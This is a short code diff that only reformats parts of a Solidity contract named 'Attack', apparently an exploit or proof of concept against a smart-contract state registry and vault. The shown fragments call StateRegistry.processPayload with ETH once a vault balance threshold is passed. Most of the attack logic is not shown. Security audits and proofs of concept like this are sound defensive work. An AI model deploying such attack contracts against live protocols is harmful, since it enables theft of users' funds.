@@ -64,9 +64,9 @@ contract Attack is Ownable, ERC1155Holder {
         if (vaultBalance > 999) {
             // send enough eth as gas to keep the tx alive, 1 as example
             try
-                StateRegistry(stateRegistryDestination).processPayload{value: 1}(
-                    payloadId
-                )
+                StateRegistry(stateRegistryDestination).processPayload{
+                    value: 1
+                }(payloadId)
             {} catch {}
         }
 
@@ -101,18 +101,14 @@ contract Attack is Ownable, ERC1155Holder {
 
     /// @dev could be removed since anyone can call processPayload
     function processPayload(uint256 payloadId) external payable {
-        StateRegistry(stateRegistryDestination).processPayload{value: msg.value}(
-            payloadId
-        );
+        StateRegistry(stateRegistryDestination).processPayload{
+            value: msg.value
+        }(payloadId);
     }
 
-    function supportsInterface(bytes4 interfaceId)
-        public
-        view
-        virtual
-        override(ERC1155Receiver)
-        returns (bool)
-    {
+    function supportsInterface(
+        bytes4 interfaceId
+    ) public view virtual override(ERC1155Receiver) returns (bool) {
         return super.supportsInterface(interfaceId);
     }
 }
